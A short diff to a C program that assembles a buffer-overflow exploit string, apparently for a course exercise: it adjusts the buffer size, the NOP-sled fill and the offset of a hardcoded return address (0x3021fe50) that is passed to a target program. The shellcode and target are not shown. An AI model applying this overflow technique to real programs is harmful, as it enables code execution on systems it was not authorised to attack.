@@ -18,7 +18,7 @@
 //We need to fill the buffer with 120 bytes of shellcode, and No-OPs
 //Then 8 bytes of the return address of buffer (0x3021fe50)
 
-#define BUF_SIZE 129
+#define BUF_SIZE 125
 
 int
 main ( int argc, char * argv[] )
@@ -35,16 +35,16 @@ main ( int argc, char * argv[] )
 	}
 
 	//Fill the remaining bytes with No-OPs
-	for (; i < BUF_SIZE - 9; i++) {
+	for (; i < BUF_SIZE - 5; i++) {
 		bufferExploit[i] = 0x90;
 	}
 
 	//Fill the last bytes with the return address of buffer
-	int *newReturnAddress = (int *)&bufferExploit[BUF_SIZE - 9];
+	int *newReturnAddress = (int *)&bufferExploit[BUF_SIZE - 5];
 	*newReturnAddress = 0x3021fe50;
 
 	//The bufferExploit string will end with NULL
-	bufferExploit[-1] = '\0';
+    	bufferExploit[124] = '\0';
 
 	args[0] = TARGET;
 	//args[1] = "hi there";
